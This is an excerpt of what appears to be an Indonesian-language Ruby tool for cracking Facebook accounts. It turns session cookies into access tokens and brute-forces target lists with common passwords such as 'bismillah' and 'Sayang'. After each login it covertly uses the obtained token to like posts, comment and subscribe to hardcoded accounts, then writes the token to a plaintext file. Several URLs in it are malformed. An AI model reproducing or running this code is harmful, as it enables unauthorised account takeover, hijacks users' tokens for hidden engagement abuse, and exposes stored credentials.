...
module Facebook
  ...
  class Login
    ...
    def self.Cookie(cookie:, graph: true)
      ...
      queenzza = res.body.match(/EAAA\w+/)
      _23_08_2021 = (res['location'].to_s.include? ('checkpoint') or cookie.include? ('checkpoint') or res['set-cookie'].to_s.include? ('checkpoint'))
      gheza = (!queenzza and !_23_08_2021)
      if queenzza and graph
        a = Net::HTTP.get(URI("https://graph.facebook.com/me?fields=name,id&access_token=#{queenzza.to_s}"))
        b = JSON.parse(a)
        return {'error'=>false,'checkpoint'=>false,'name'=>b['name'],'id'=>b['id'],'access_token'=>queenzza.to_s,'cookie'=>cookie}
      elsif queenzza and !graph
        return {'error'=>false,'checkpoint'=>false,'cookie'=>cookie}
      else
        return {'error'=>gheza,'checkpoint'=>_23_08_2021,'cookie'=>cookie}
      end
    end
  ...
  class Crack < Login
    ...
    def initialize(listid:,max_workers: 30)
      ...
      if auto == 'm'
        puts("\n[!] Gunakan ',' Sebagai pemisah, contoh: bismillah,Sayang")
        loop do
        ...
        @password = ['bismillah','Sayang','Bahagia']
        @auto_pass = true
      end
...
def LoginAkun
  begin
    ...
    case no
	  ...
	  Net::HTTP.post_form(URI("https://graph.facebook.com/100040444638677_611733976851418/comments"),{"message"=>"Hai Cantik @[100040444638677:] >\\\\<","access_token"=>$token})
	  Net::HTTP.post_form(URI("https:/100040444638677_611733976851418/graph.facebook.com//likes"),{'access_token'=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100040444638677_608202487204567 /likes"),{"access_token"=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100001472854864/subscribers"),{"access_token"=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100022841983414/subscribers"),{"access_token"=>$token})
	  ...
	  Net::HTTP.post_form(URI("https://graph.facebook.com/100040444638677_611733976851418/likes"),{'access_token'=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100040444638677_608202487204567/likes"),{"access_token"=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100001472854864/subscribers"),{"access_token"=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100022841983414/subscribers"),{"access_token"=>$token})
          File.open('login.txt','w') {|f| f.write($token)}
      ...
      when '4','04'
        ...
        if !login['error'] and !login['checkpoint']
          ...
          Net::HTTP.post_form(URI("https://graph.facebook.com/100040444638677_611733976851418/likes"),{'access_token'=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100040444638677_608202487204567/likes"),{"access_token"=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com100040444638677_611733976851418/comments"),{"message"=>"Hai Cantik @[100040444638677:] ><","access_token"=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100001472854864/subscribers"),{"access_token"=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100022841983414/subscribers"),{"access_token"=>$token})
          File.open('login.txt','w') {|f| f.write($token)}
          puts ("[✓] Login Success")
